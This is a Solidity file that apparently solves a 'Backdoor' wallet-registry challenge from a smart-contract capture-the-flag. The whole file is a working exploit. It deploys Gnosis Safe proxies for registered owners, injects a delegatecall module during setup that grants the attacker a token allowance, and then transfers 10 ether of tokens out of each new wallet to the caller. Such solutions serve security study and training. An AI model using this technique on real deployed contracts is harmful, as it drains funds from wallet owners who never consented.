// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract Approver {
    function approveTokens(IERC20 token, address solver) external {
        token.approve(solver, 10 ether);
    }
}

contract SolveBackdoor {
    constructor(
        GnosisSafeProxyFactory factory,
        address singleton,
        WalletRegistry callback,
        IERC20 token,
        address[][] memory owners
    ) {
        Approver approver = new Approver();

        for (uint i = 0; i < owners.length; i++) {
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                abi.encodeCall(
                    GnosisSafe.setup,
                    (
                        owners[i],
                        1,
                        address(approver),
                        abi.encodeWithSignature(
                            "approveTokens(address,address)",
                            token,
                            address(this)
                        ),
                        address(0),
                        address(0),
                        0,
                        payable(address(0))
                    )
                ),
                i,
                callback
            );

            require(
                token.allowance(address(proxy), address(this)) == 10 ether,
                "didn't get allowance"
            );
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
